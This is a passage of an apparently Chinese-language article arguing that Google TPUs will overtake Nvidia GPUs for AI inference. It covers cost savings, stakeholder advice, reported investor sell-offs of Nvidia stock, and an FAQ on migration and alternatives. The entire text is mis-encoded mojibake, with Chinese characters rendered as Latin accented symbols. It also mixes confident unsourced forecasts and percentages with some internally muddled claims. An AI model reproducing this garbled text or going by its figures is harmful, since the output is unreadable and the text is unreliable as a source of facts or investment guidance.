<p>æ€»æ‹¥æœ‰æˆæœ¬ (TCO)ï¼š é™¤äº†ç¡¬ä»¶æˆæœ¬å¤–ï¼Œè¿˜è¦è€ƒè™‘å†·å´ã€ç”µåŠ›åŸºç¡€è®¾æ–½å’Œç¢³ä¿¡ç”¨é¢åº¦ã€‚å¦‚æœå°†è¿™äº›è¿è¥æˆæœ¬è€ƒè™‘åœ¨å†…ï¼ŒTPU çš„æ•ˆç‡ä¼˜åŠ¿å°†æå‡è‡³ 2-3 å€ã€‚</p>
<p>æœªè§£å†³çš„é—®é¢˜ï¼šç¯å¢ƒä»£ä»·ã€‚æ¨ç†çš„æ’æ”¾é‡å¯èƒ½è¿œè¶…è®­ç»ƒã€‚ä»… ChatGPT æ¯å¹´å°±æ’æ”¾ 12800 å…¬å¨äºŒæ°§åŒ–ç¢³ï¼Œæ˜¯ GPT-3 è®­ç»ƒçš„ 25 å€ã€‚TPU çš„æ•ˆç‡ï¼ˆæ¯”ä¸Šä¸€ä»£é«˜å‡º 15 å€ï¼‰ä½¿è°·æ­Œæˆä¸ºå¯æŒç»­å‘å±•çš„é€‰æ‹©ï¼Œè¿™åœ¨ç›‘ç®¡æ—¥ç›Šä¸¥æ ¼çš„ä»Šå¤©è‡³å…³é‡è¦ã€‚</p>
<p>æ·±åº¦å­¦ä¹ æ¨ç†ä¼˜åŒ–çš„æŒ‘æˆ˜ä¸ä»…ä»…æ˜¯æŠ€æœ¯æ€§çš„ï¼Œæ›´æ˜¯å…³ä¹ä¼ä¸šç”Ÿå­˜çš„ã€‚å¿½è§†è¿™ä¸€è½¬å˜çš„å…¬å¸å°†é¢ä¸´æˆæœ¬ç»“æ„å¤±è¡¡çš„é£é™©ï¼Œå¯¼è‡´æ— æ³•å¤§è§„æ¨¡ç›ˆåˆ©ã€‚</p>
<p>å¯¹åˆ©ç›Šç›¸å…³è€…çš„æ„ä¹‰ï¼šTPU é©å‘½çš„è¿é”ååº”</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f79df42e102c46258539198bf7ce0cd0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765881115&amp;x-signature=tGanE%2FZCYOc4aYDL20wlYQ689dw%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>TPU ä¸ GPU ä¹‹äº‰å¹¶éæŠ½è±¡æ¦‚å¿µï¼Œå®ƒé‡å¡‘äº†æ•´ä¸ªå•†ä¸šæ¨¡å¼ã€æŠ•èµ„ç†å¿µå’ŒèŒä¸šå‘å±•è½¨è¿¹ã€‚ä»¥ä¸‹æ˜¯ä¸åŒå‚ä¸è€…åº”è¯¥å¦‚ä½•åº”å¯¹ã€‚</p>
<p>å¯¹äº AI åˆåˆ›å…¬å¸ï¼šå¤§å‡è¡¡åŒ–</p>
<p>TPU é™ä½äº†æ¨ç†æˆæœ¬ï¼Œä½¿ç²¾ç®€å›¢é˜Ÿä¹Ÿèƒ½ä¸å·¨å¤´ç«äº‰ã€‚Midjourney èŠ‚çœäº† 65% çš„æˆæœ¬ï¼Œä»è€Œå»¶é•¿äº†èµ„é‡‘ä½¿ç”¨å‘¨æœŸå¹¶åŠ å¿«äº†æ‰©å±•é€Ÿåº¦ã€‚ç§å­è½®å…¬å¸å¦‚æœä½¿ç”¨ TPU è¿›è¡Œæ¨ç†ï¼Œå°±èƒ½å®ç°ä»¥å¾€åªæœ‰æ‹¥æœ‰å·¨é¢ GPU é¢„ç®—çš„ B è½®åŠä»¥åèèµ„é˜¶æ®µçš„å…¬å¸æ‰èƒ½è¾¾åˆ°çš„æˆæœ¬ç»“æ„ã€‚</p>
<p>å®¡æ ¸æ‚¨çš„æ¨ç†è´¹ç”¨ã€‚å¦‚æœæ‚¨æ¯æœˆåœ¨è‹±ä¼Ÿè¾¾æ˜¾å¡ä¸Šçš„æ”¯å‡ºè¶…è¿‡ 2 ä¸‡ç¾å…ƒï¼Œè¯·å¼€å±• TPU è¯•ç‚¹é¡¹ç›®ã€‚TensorFlow æ¨¡å‹ä¼˜åŒ–å’Œ JAX ç­‰å·¥å…·å¯ä½¿è¿ç§»è¿‡ç¨‹æ¯”ä»¥å¾€ä»»ä½•æ—¶å€™éƒ½æ›´åŠ é¡ºç•…ã€‚</p>
<p>å¯¹äºä¼ä¸š CTOï¼šæˆ˜ç•¥å¿…è¦æ€§</p>
<p>15 å€çš„æ¨ç†æˆæœ¬å€å¢æ•ˆåº”è¦æ±‚æˆ‘ä»¬ç°åœ¨å°±åšå‡ºæˆ˜ç•¥æ€§çš„ç¡¬ä»¶é€‰æ‹©ï¼Œè€Œä¸æ˜¯ä»¥åã€‚åˆ° 2026 å¹´ï¼Œå°†é«˜å®¹é‡æ¨ç†è¿ç§»åˆ° TPU å¯ä»¥èŠ‚çœ 40-60% çš„è®¡ç®—é¢„ç®—ï¼Œä»è€Œå°†èµ„é‡‘ç”¨äºåˆ›æ–°è€Œä¸æ˜¯åŸºç¡€è®¾æ–½å»ºè®¾ã€‚</p>
<p>éšè—çš„å¥½å¤„ï¼š TPU çš„ä½åŠŸè€—å¯é™ä½æ•°æ®ä¸­å¿ƒå†·å´æˆæœ¬ 30-40%ï¼ŒåŒæ—¶æ»¡è¶³é¢„ç®—å’Œå¯æŒç»­æ€§è¦æ±‚ã€‚</p>
<p>é£é™©ï¼š è¡ŒåŠ¨è¿Ÿç¼“æ„å‘³ç€ç«äº‰å¯¹æ‰‹å°†è·å¾—æˆæœ¬ä¼˜åŠ¿ï¼Œè€Œä¸”è¿™ç§ä¼˜åŠ¿ä¼šé€å­£åº¦ç´¯ç§¯ã€‚ä¾‹å¦‚ï¼Œç«äº‰å¯¹æ‰‹æ¯å¹´åœ¨æ¨ç†æ–¹é¢èŠ‚çœ 500 ä¸‡ç¾å…ƒï¼Œå¹¶å°†å…¶é‡æ–°æŠ•å…¥åˆ°æ›´ä¼˜çš„æ¨¡å‹ä¸­ï¼Œä»è€Œå¯¼è‡´å·®è·ä¸æ–­æ‰©å¤§ã€‚</p>
<p>å¯¹äºè‹±ä¼Ÿè¾¾æŠ•èµ„è€…ï¼šåˆ©æ¶¦ç‡å‹ç¼©çš„å¨èƒ</p>
<p>å°½ç®¡è‹±ä¼Ÿè¾¾ 2024 å¹´æ•°æ®ä¸­å¿ƒä¸šåŠ¡è¥æ”¶é¢„è®¡å°†è¾¾åˆ° 600 äº¿ç¾å…ƒï¼Œä½† TPU çš„æ™®åŠåº”ç”¨å´å¸¦æ¥äº†é•¿æœŸçš„åˆ©æ¶¦é£é™©ã€‚å¦‚æœè°·æ­Œèƒ½å¤Ÿå æ®å“ªæ€• 10% çš„æ¨ç†å·¥ä½œè´Ÿè½½ï¼ˆè€ƒè™‘åˆ°ç›®å‰çš„è¿ç§»æƒ…å†µï¼Œè¿™è¿˜æ˜¯ä¿å®ˆä¼°è®¡ï¼‰ï¼Œé‚£ä¹ˆæ¯å¹´è‹±ä¼Ÿè¾¾çš„åˆ©æ¶¦å°±å°†é¢ä¸´è¶…è¿‡ 60 äº¿ç¾å…ƒçš„æŸå¤±ã€‚</p>
<p>å¯¹ä½ï¼š Â è‹±ä¼Ÿè¾¾çš„ Blackwell æ¶æ„ ï¼ˆé¢„è®¡ 2025 å¹´å‘å¸ƒï¼‰æ‰¿è¯ºæå‡æ¨ç†æ•ˆç‡ã€‚ç„¶è€Œï¼Œæ—©æœŸåŸºå‡†æµ‹è¯•è¡¨æ˜ï¼Œåœ¨çº¯ç²¹çš„å¤§è§„æ¨¡æ¨ç†æ–¹é¢ï¼ŒTPU ä»ä¿æŒç€ 2-3 å€çš„æˆæœ¬ä¼˜åŠ¿ï¼Œè¿™é™åˆ¶äº† Blackwell çš„å½±å“ã€‚</p>
<p>å¯†åˆ‡å…³æ³¨è‹±ä¼Ÿè¾¾ 2026 å¹´ç¬¬ä¸€å­£åº¦è´¢æŠ¥ã€‚å¦‚æœæ¨ç†é©±åŠ¨çš„æ”¶å…¥ç¯æ¯”å¢é•¿æ”¾ç¼“è‡³ 15% ä»¥ä¸‹ï¼Œåˆ™è¡¨æ˜ TPU èš•é£Ÿæ•ˆåº”ç¡®å®å­˜åœ¨ã€‚</p>
<p>å¯¹äºå¼€å‘è€…å’Œæœºå™¨å­¦ä¹ å·¥ç¨‹å¸ˆï¼šèŒä¸šæœªæ¥ä¿éšœ</p>
<p>CUDA ç”Ÿæ€ç³»ç»Ÿé•¿è¾¾ 15 å¹´çš„æŠ¤åŸæ²³æ­£åœ¨é€æ¸æ¶ˆå¤±ã€‚éšç€ JAXã€TensorFlow å’Œ TPU ä¼˜åŒ–æŠ€æœ¯çš„æ™®åŠï¼Œå­¦ä¹ è¿™äº›æŠ€æœ¯èƒ½å¤Ÿç¡®ä¿èŒä¸šå‘å±•çš„æœªæ¥ç«äº‰åŠ›ã€‚2024 å¹´ï¼Œã€ŒTPU ä¼˜åŒ–å·¥ç¨‹å¸ˆã€çš„èŒä½å‘å¸ƒé‡åŒæ¯”å¢é•¿äº† 340%ã€‚</p>
<p>æŠ€èƒ½è½¬å˜ï¼š ä»é€šç”¨ GPU ç¼–ç¨‹è½¬å‘ ASIC æ„ŸçŸ¥æ¨¡å‹è®¾è®¡ã€‚ç†è§£è„‰åŠ¨é˜µåˆ—çš„ç¼–è¯‘å™¨ä¼˜åŒ–ï¼Œå…¶ä»·å€¼å ªæ¯” 2020 å¹´çš„ CUDA å†…æ ¸è°ƒä¼˜ã€‚</p>
<p>æœºé‡ï¼š æ—©æœŸ TPU ä¸“ä¸šçŸ¥è¯†å¯è·å¾— 20-30% çš„è–ªèµ„æº¢ä»·ï¼Œå› ä¸ºå…¬å¸éƒ½åœ¨äº‰ç›¸å¯»æ‰¾äººæ‰æ¥æ‰§è¡Œè¿ç§»ã€‚</p>
<p>åå°”è¡—çš„è‹±ä¼Ÿè¾¾å¤§æ’¤é€€ï¼šä¸ºä½•ç²¾è‹±æŠ•èµ„è€…æŠ›å”® 60 äº¿ç¾å…ƒ GPU è‚¡ç¥¨</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6efcd7693de04deebaffe456e8c5ba2f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765881115&amp;x-signature=0AO9ZsqfjswxOkFzvneoicraK%2Fc%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>éšç€æ¨ç†é©å‘½çš„åŠ é€Ÿï¼Œè‹±ä¼Ÿè¾¾æ›¾ç»ä¸å¯æ’¼åŠ¨çš„ç»Ÿæ²»åœ°ä½æ­£é¢ä¸´ç€åå°”è¡—æœ€æ•é”çš„æŠ•èµ„è€…ä»¬çš„ä¸¥å³»ç°å®æ£€éªŒï¼Œä»–ä»¬æ­£æ‚„ç„¶é€€å‡ºå¸‚åœºã€‚</p>
<p>ç§‘æŠ€è¿œè§å®¶å½¼å¾—ãƒ»è’‚å°” (Peter Thiel) æ——ä¸‹çš„å¯¹å†²åŸºé‡‘ Thiel Macro LLC åœ¨ 2025 å¹´ç¬¬ä¸‰å­£åº¦æŠ›å”®äº†å…¶æŒæœ‰çš„å…¨éƒ¨ 537742 è‚¡è‹±ä¼Ÿè¾¾è‚¡ç¥¨ï¼ˆæˆªè‡³ 9 æœˆåº•ï¼Œä»·å€¼çº¦ 1 äº¿ç¾å…ƒï¼‰ï¼Œå¹¶å°†æ‰€å¾—èµ„é‡‘é‡æ–°æŠ•èµ„äºè‹¹æœå’Œå¾®è½¯ç­‰æ›´å…·é˜²å¾¡æ€§çš„è‚¡ç¥¨ï¼Œä»¥åº”å¯¹æ—¥ç›Šå¢é•¿çš„äººå·¥æ™ºèƒ½æ³¡æ²«ç ´è£‚çš„æ‹…å¿§ã€‚</p>
<p>è¿™å¹¶éå­¤ä¾‹ã€‚å°±åœ¨å‡ å‘¨å‰ï¼Œæ—¥æœ¬è½¯é“¶ä¹ŸæŠ›å”®äº†å…¶æŒæœ‰çš„å…¨éƒ¨ 3210 ä¸‡è‚¡è‚¡ç¥¨ï¼Œå¥—ç°é«˜è¾¾ 58.3 äº¿ç¾å…ƒï¼Œå¹¶å°†èµ„é‡‘æŠ•å…¥ OpenAIï¼Œä»¥æœŸä»ç¡¬ä»¶ç‚’ä½œè½¬å‘è½¯ä»¶ç”Ÿæ€ç³»ç»Ÿã€‚å°±è¿é¢„è¨€äº† 2008 å¹´é‡‘èå±æœºçš„ã€Šå¤§ç©ºå¤´ã€‹é¢„è¨€å®¶è¿ˆå…‹å°”ãƒ»ä¼¯é‡Œï¼Œä¹Ÿåœ¨ 2025 å¹´æœ«æ–¥èµ„ 920 ä¸‡ç¾å…ƒä¹°å…¥äº†é’ˆå¯¹è‹±ä¼Ÿè¾¾çš„çœ‹è·ŒæœŸæƒï¼ŒæŠ¼æ³¨éšç€ Meta å’Œ Oracle ç­‰è¶…å¤§è§„æ¨¡æ•°æ®ä¸­å¿ƒè¿è¥å•†é¢ä¸´æ•°æ®ä¸­å¿ƒè¿‡å‰©å’Œ GPU åº“å­˜è´¬å€¼çš„é—®é¢˜ï¼Œè‹±ä¼Ÿè¾¾çš„ä¼°å€¼å°†ä¼šæš´è·Œã€‚</p>
<p>è¿™äº›ç²¾è‹±æŠ•èµ„è€…å¹¶éæ”¾å¼ƒäººå·¥æ™ºèƒ½ã€‚ä»–ä»¬åªæ˜¯åœ¨æŠ›å”®è‹±ä¼Ÿè¾¾é«˜è¾¾ 70 å€é¢„æœŸå¸‚ç›ˆç‡çš„è‚¡ç¥¨ï¼Œå› ä¸ºè°·æ­Œ TPU çš„ç«äº‰æ—¥ç›Šæ¿€çƒˆï¼Œä»¥åŠéšç€è®­ç»ƒé˜¶æ®µçš„è¾‰ç…Œé€æ¸è¤ªå»ï¼Œæ¨ç†æˆæœ¬ä¸æ–­æ”€å‡ä¾µèš€åˆ©æ¶¦ç‡çš„æ‹…å¿§ä»¤ä»–ä»¬æ„Ÿåˆ°ä¸å®‰ã€‚å°½ç®¡è‹±ä¼Ÿè¾¾ç›ˆåˆ©å¼ºåŠ²ï¼Œä½†å…¶è‚¡ä»·ä»è¾ƒ 10 æœˆä»½çš„é«˜ç‚¹ä¸‹è·Œäº† 12%ï¼Œæœºæ„æŠ•èµ„è€…çš„èµ„é‡‘å¤–æµä¹Ÿåæ˜ äº†ç§‘æŠ€è¡Œä¸šçš„æ•´ä½“ç„¦è™‘æƒ…ç»ªã€‚</p>
<p>è¿™æ³¢è¶…è¿‡ 60 äº¿ç¾å…ƒçš„èµ„é‡‘å¤–æµå‡¸æ˜¾äº†ä¸€ä¸ªæ®‹é…·çš„ç°å®ï¼šå½“æ¨ç†è¿ç®—çš„ç»“æœå¯¹ ASIC èŠ¯ç‰‡æ¯”å¯¹ GPU èŠ¯ç‰‡æ›´æœ‰åˆ©æ—¶ï¼Œå³ä½¿æ˜¯äººå·¥æ™ºèƒ½é¢†åŸŸçš„å·¨å¤´ä¹Ÿä¸å¾—ä¸å±ˆæœäºè°¨æ…çš„èµ„æœ¬å¤–é€ƒæµªæ½®ã€‚</p>
<p>è§£ç æŠ›å”®æ½®ï¼šç²¾æ˜æŠ•èµ„è€…çœ‹åˆ°çš„ä¸‰ä¸ªå±é™©ä¿¡å·</p>
<p>ä¾›åº”è¿‡å‰©å’Œè´¬å€¼ï¼š è¶…å¤§è§„æ¨¡æ•°æ®ä¸­å¿ƒåœ¨ 2023-2024 å¹´é—´å¤§é‡è´­å…¥ H100 æ˜¾å¡ï¼Œä¸ºè®­ç»ƒæ•°æ®æ¿€å¢è€Œæ‰©å®¹ï¼Œä½†è¿™äº›æ¿€å¢å¹¶æœªå®Œå…¨å®ç°ã€‚å¦‚ä»Šï¼Œæ•°æ®ä¸­å¿ƒä½¿ç”¨çš„èµ„äº§æ­£åœ¨è´¬å€¼ï¼ˆGPU ä»·å€¼æ¯å¹´ä¸‹é™ 30-40%ï¼‰ï¼Œè€Œæ¨ç†éœ€æ±‚å´éœ€è¦æ›´ä¾¿å®œçš„ ASIC èŠ¯ç‰‡ã€‚è¿™ç§ä¾›éœ€ä¸åŒ¹é…ä»¤é‚£äº›é¢„æœŸ GPU å°†æŒç»­å‡çº§çš„æˆé•¿å‹æŠ•èµ„è€…æ„Ÿåˆ°ææ…Œã€‚</p>
<p>åˆ©æ¶¦ç‡å³å°†å‹ç¼©ï¼š TPU å°†ä¸»å¯¼æ¨ç†ä»»åŠ¡ï¼ˆæœªæ¥ 75% çš„è®¡ç®—é‡ï¼‰ï¼Œè¿™æ„å‘³ç€è‹±ä¼Ÿè¾¾å¿…é¡»åœ¨ä»·æ ¼ä¸Šå±•å¼€ç«äº‰ã€‚å…¶ 70-80% çš„æ¯›åˆ©ç‡å°†é¢ä¸´ä¸å¯é¿å…çš„æŒ¤å‹ã€‚å³ä½¿æ¯›åˆ©ç‡ä¸‹é™ 10 ä¸ªç™¾åˆ†ç‚¹ï¼Œä¹Ÿä¼šä½¿ç›®å‰çš„ä¼°å€¼å€æ•°å¤§å¹…ä¸‹æ»‘ã€‚</p>
<p>å¤šå…ƒåŒ–ç°å®ï¼š åƒ Meta è¿™æ ·çš„å®¢æˆ·å¹¶æ²¡æœ‰å®Œå…¨æ”¾å¼ƒè‹±ä¼Ÿè¾¾ï¼Œä½†ä»–ä»¬æ­£åœ¨ç§¯æè¿›è¡Œå¤šå…ƒåŒ–æŠ•èµ„ã€‚å®¢æˆ·åœ¨ TPU ä¸Šçš„æ¯ä¸€ç¾å…ƒæ”¯å‡ºï¼Œéƒ½æ„å‘³ç€è‹±ä¼Ÿè¾¾å°‘èµšä¸€ç¾å…ƒã€‚éšç€ Metaã€Anthropic å’Œ Midjourney ç­‰å…¬å¸å…¬å¼€æ‹¥æŠ±æ›¿ä»£æ–¹æ¡ˆï¼Œè‹±ä¼Ÿè¾¾çš„æ”¶å…¥é›†ä¸­åº¦é£é™©å·²å˜å¾—å²Œå²Œå¯å±ã€‚</p>
<p>å½“ç„¶ä¹Ÿæœ‰ä¸åŒè§‚ç‚¹ï¼Œè‹±ä¼Ÿè¾¾ä»ç„¶å æ® 80% çš„å¸‚åœºä»½é¢ï¼Œå¸ƒè±å…‹å¨å°”å³å°†åŠ å…¥ï¼ŒCUDA çš„æŠ¤åŸæ²³ä¹Ÿä¸ä¼šåœ¨ä¸€å¤œä¹‹é—´å´©å¡Œã€‚</p>
<p>æŒ‘æˆ˜ä¸æœªæ¥ä¹‹è·¯</p>
<p>TPU å¹¶éå®Œç¾æ— ç¼ºã€‚ä¸è‹±ä¼Ÿè¾¾çš„ CUDA é€šç”¨æ€§ç›¸æ¯”ï¼Œå…¶ç”Ÿæ€ç³»ç»Ÿä¸ TensorFlow/JAX çš„ç´§å¯†è”ç³»é™åˆ¶äº†çµæ´»æ€§ã€‚æ‰©å±• TPUï¼ˆæœ€å¤šå¯è¾¾ 4096 ä¸ªèŠ¯ç‰‡ï¼‰éœ€è¦ Google Cloud çš„æŠ•å…¥ï¼Œè€Œæœ¬åœ°éƒ¨ç½²çš„ TPU å¸‚åœºå°šå¤„äºèµ·æ­¥é˜¶æ®µï¼Œæ··åˆæ¶æ„å°†ä¼šæŒç»­å­˜åœ¨ï¼šNvidia ç”¨äºè®­ç»ƒçš„æç«¯æƒ…å†µï¼ŒTPU ç”¨äºæ¨ç†çš„å¤§è§„æ¨¡åº”ç”¨ã€‚</p>
<p>æ–°å…´ç«äº‰ï¼š äºšé©¬é€Šçš„ Trainium å’Œå¾®è½¯çš„ Maia èŠ¯ç‰‡ç„å‡†ç›¸ä¼¼çš„ç»†åˆ†å¸‚åœºï¼ŒåŠ å‰§äº† ASIC å¸‚åœºçš„ç¢ç‰‡åŒ–ã€‚ç„¶è€Œï¼Œè¿™ä¸¤æ¬¾èŠ¯ç‰‡çš„æˆç†Ÿåº¦ï¼ˆå·²å‘å±•ä¹ä»£ï¼‰å’Œè§„æ¨¡ï¼ˆä¸ºè°·æ­Œçš„ä¸‡äº¿æŸ¥è¯¢åŸºç¡€è®¾æ–½æä¾›æ”¯æŒï¼‰éƒ½æ— æ³•ä¸ TPU ç›¸æå¹¶è®ºã€‚</p>
<p>ä¾›åº”é“¾ï¼š è°·æ­Œä¸åšé€šå’Œå°ç§¯ç”µåˆä½œï¼ŒåŠ é€Ÿ v7 èŠ¯ç‰‡çš„ç”Ÿäº§ï¼Œä»¥è§£å†³äº§èƒ½é—®é¢˜ã€‚åˆ° 2026 å¹´ç¬¬äºŒå­£åº¦ï¼ŒTPU çš„ä¾›åº”é‡åº”è¯¥èƒ½å¤Ÿæ»¡è¶³éœ€æ±‚ï¼Œä»è€Œæ¶ˆé™¤å¸‚åœºé‡‡ç”¨éšœç¢ã€‚</p>
<p>ç›®å‰çš„åŠ¿å¤´å¯¹è°·æ­Œæœ‰åˆ©ã€‚éšç€ v7 TPU åœ¨ 2025 å¹´é‡äº§ï¼Œä»¥åŠåšé€š / å°ç§¯ç”µç­‰åˆä½œä¼™ä¼´åŠ é€Ÿç”Ÿäº§ï¼Œä¾›åº”é“¾æ­£åœ¨é€æ­¥å®Œå–„ã€‚éšç€æ¨ç†èƒ½åŠ›çš„æ¿€å¢ï¼ŒTPU çš„åº”ç”¨ä¹Ÿå°†éšä¹‹æ‰©å±•ã€‚</p>
<p>2025 å¹´äººå·¥æ™ºèƒ½å·¥ä½œè´Ÿè½½ä¸­ TPU ä¸ Nvidia GPU çš„æ¯”è¾ƒ</p>
<p>å¯¹äºæ‰€æœ‰äººå·¥æ™ºèƒ½å·¥ä½œè´Ÿè½½ï¼ŒTPU éƒ½æ¯” Nvidia GPU æ›´å¥½å—ï¼Ÿ</p>
<p>ä¸ã€‚TPU åœ¨æ¨ç†å’Œå¼ é‡å¯†é›†å‹æ“ä½œæ–¹é¢è¡¨ç°å‡ºè‰²ï¼Œåœ¨è¿è¡Œ LLMã€å›¾åƒç”Ÿæˆå’Œæ¨èç­‰æ¨¡å‹æ—¶ï¼Œæ€§ä»·æ¯”æ¯” GPU é«˜å‡º 4 å€ã€‚Nvidia GPU åœ¨è®­ç»ƒå„ç§æ¨¡å‹ã€éœ€è¦çµæ´»æ€§çš„ç ”ç©¶ä»¥åŠæ¸¸æˆã€å›¾å½¢æ¸²æŸ“å’Œé€šç”¨è®¡ç®—ç­‰éå¼ é‡å·¥ä½œè´Ÿè½½æ–¹é¢ä»ç„¶æ›´èƒœä¸€ç­¹ã€‚æœ€ä½³ç­–ç•¥é€šå¸¸æ˜¯æ··åˆä½¿ç”¨ï¼šTPU ç”¨äºç”Ÿäº§æ¨ç†ï¼ŒGPU ç”¨äºå®éªŒã€‚</p>
<p>æˆ‘å¯ä»¥åœ¨ Google Cloud ä¹‹å¤–ä½¿ç”¨ TPU å—ï¼Ÿ</p>
<p>ç›®å‰ï¼ŒTPU ä¸»è¦é€šè¿‡ Google Cloud Platform æä¾›ï¼Œä½†å¤§å‹ä¼ä¸šå®¢æˆ·ï¼ˆä¾‹å¦‚ Meta çš„ 2027 å¹´è®¡åˆ’ï¼‰ä¹Ÿå¼€å§‹é‡‡ç”¨æœ¬åœ°éƒ¨ç½²æ–¹æ¡ˆã€‚Nvidia åœ¨ AWSã€Azure å’Œæœ¬åœ°éƒ¨ç½²æ–¹é¢çš„å¹¿æ³›å¯ç”¨æ€§ä»ç„¶æ˜¯å¤šäº‘æˆ˜ç•¥çš„ä¼˜åŠ¿ã€‚ä¸è¿‡ï¼ŒGoogle æ­£åœ¨é€šè¿‡åˆä½œä¼™ä¼´å…³ç³»å’Œæ‰˜ç®¡é€‰é¡¹æ¥æ‰©å±• TPU çš„è®¿é—®æƒé™ã€‚</p>
<p>è‹±ä¼Ÿè¾¾çš„ Blackwell èŠ¯ç‰‡èƒ½å¦åœ¨æ¨ç†æ–¹é¢ä¸ TPU å±•å¼€ç«äº‰ï¼Ÿ</p>
<p>è‹±ä¼Ÿè¾¾çš„ Blackwell æ¶æ„ï¼ˆé¢„è®¡ 2025 å¹´å‘å¸ƒï¼‰æ‰¿è¯ºé€šè¿‡ FP4 ç²¾åº¦å’Œæ›´é«˜çš„å†…å­˜å¸¦å®½ç­‰ç‰¹æ€§æ¥æå‡æ¨ç†æ•ˆç‡ã€‚ç„¶è€Œï¼Œæ—©æœŸåŸºå‡†æµ‹è¯•å’Œæ¶æ„åˆ†æè¡¨æ˜ï¼Œç”±äº ASIC èŠ¯ç‰‡çš„ä¸“ç”¨æ€§ï¼ŒTPU åœ¨å¤§è§„æ¨¡çº¯æ¨ç†æ–¹é¢ä»ä¿æŒç€ 2-3 å€çš„æˆæœ¬ä¼˜åŠ¿ã€‚Blackwell æ¶æ„å°†æ¯” Hopperï¼ˆH100ï¼‰æ›´å…·ç«äº‰åŠ›ï¼Œä½†å¯èƒ½æ— æ³•å®Œå…¨å¼¥è¡¥åœ¨é«˜å®¹é‡æ¨ç†å·¥ä½œè´Ÿè½½æ–¹é¢çš„å·®è·ã€‚</p>
<p>ä»è‹±ä¼Ÿè¾¾å¹³å°è¿ç§»åˆ° TPU çš„æˆæœ¬å’Œæ—¶é—´æ˜¯å¤šå°‘ï¼Ÿ</p>
<p>è¿ç§»éœ€è¦å°†ä»£ç ä» CUDA/PyTorch é€‚é…åˆ° TensorFlow/JAXï¼Œå¤§å‹éƒ¨ç½²é€šå¸¸éœ€è¦ 2-6 ä¸ªæœˆï¼Œå…·ä½“æ—¶é—´å–å†³äºæ¨¡å‹å¤æ‚åº¦ã€‚æˆæœ¬åŒ…æ‹¬å·¥ç¨‹æ—¶é—´ï¼ˆå¤§å‹è¿ç§»éœ€è¦ 4-8 ä¸ªå…¨èŒå‘˜å·¥æœˆï¼‰ä»¥åŠè¿‡æ¸¡æœŸé—´çš„å¹¶è¡ŒåŸºç¡€è®¾æ–½ã€‚ç„¶è€Œï¼Œåƒ Midjourney è¿™æ ·çš„å…¬å¸å¯ä»¥é€šè¿‡æŒç»­èŠ‚çœ 40-65% çš„æˆæœ¬ï¼Œåœ¨ 3-4 ä¸ªæœˆå†…æ”¶å›è¿™äº›æˆæœ¬ã€‚è§„æ¨¡è¾ƒå°çš„é¡¹ç›®ï¼ˆæ¯æœˆæ¨ç†æˆæœ¬ä½äº 5 ä¸‡ç¾å…ƒï¼‰å¯èƒ½ä¸å€¼å¾—æŠ•å…¥è¿™äº›é¢å¤–è´¹ç”¨ã€‚</p>
<p>TPU å¦‚ä½•å¤„ç†è‡ªå®šä¹‰ AI æ¨¡å‹å’Œæ¶æ„ï¼Ÿ</p>
<p>TPU åœ¨æ ‡å‡†æ¶æ„ï¼ˆTransformerã€CNNã€RNNï¼‰ä¸Šè¡¨ç°å‡ºè‰²ï¼Œä½†å¯¹äºè‡ªå®šä¹‰æ“ä½œåˆ™éœ€è¦é‡æ–°ç¼–è¯‘ã€‚JAX çš„ XLA ç¼–è¯‘å™¨å¯ä»¥è‡ªåŠ¨å¤„ç†å¤§å¤šæ•°æƒ…å†µï¼Œä½†å¯¹äºç‰¹æ®Šæ¶æ„å¯èƒ½éœ€è¦ä¼˜åŒ–ã€‚è‹±ä¼Ÿè¾¾çš„ CUDA ä¸ºå®éªŒæ€§å·¥ä½œæä¾›äº†æ›´å¤§çš„çµæ´»æ€§ã€‚æœ€ä½³å®è·µï¼šå…ˆåœ¨ GPU ä¸Šè¿›è¡ŒåŸå‹è®¾è®¡ï¼Œå¾…æ¶æ„ç¨³å®šåå†é’ˆå¯¹ TPU ä¼˜åŒ–ç”Ÿäº§æ¨¡å‹ã€‚</p>
<p>é‚£ä¹ˆï¼Œåƒ AMD æˆ– Intel èŠ¯ç‰‡è¿™æ ·çš„ GPU æ›¿ä»£æ–¹æ¡ˆï¼Œç”¨äºäººå·¥æ™ºèƒ½æ¨ç†åˆå¦‚ä½•å‘¢ï¼Ÿ</p>
<p>AMD çš„ MI300 å’Œè‹±ç‰¹å°”çš„ Gaudi èŠ¯ç‰‡é¢å‘ç›¸ä¼¼çš„å¸‚åœºï¼Œä½†åœ¨ç”Ÿæ€ç³»ç»Ÿæˆç†Ÿåº¦å’Œè§„æ¨¡åŒ–åº”ç”¨æ–¹é¢ç•¥é€Šä¸€ç­¹ã€‚AMD çš„äº§å“ç›¸æ¯”è‹±ä¼Ÿè¾¾çš„äº§å“å¯èŠ‚çœ 30-40% çš„æˆæœ¬ï¼Œä½†å…¶æ•ˆç‡ä»ä¸åŠ TPUã€‚è‹±ç‰¹å°”çš„ Gaudi èŠ¯ç‰‡å±•ç°å‡ºä¸€å®šçš„æ½œåŠ›ï¼Œä½†ç›®å‰é‡äº§éƒ¨ç½²æœ‰é™ã€‚å±•æœ› 2025-2026 å¹´ï¼ŒTPU ä»ç„¶æ˜¯æ¨ç†ä¼˜åŒ–é¢†åŸŸç›¸å¯¹äºè‹±ä¼Ÿè¾¾çš„æœ€ä½³é€‰æ‹©ï¼Œå…¶ä»–æ–¹æ¡ˆåˆ™ä½œä¸ºå¤‡é€‰ã€‚</p>
<p>ç»“è®ºï¼šTPU é©±åŠ¨çš„äººå·¥æ™ºèƒ½ä¸–ç•Œå³å°†åˆ°æ¥</p>
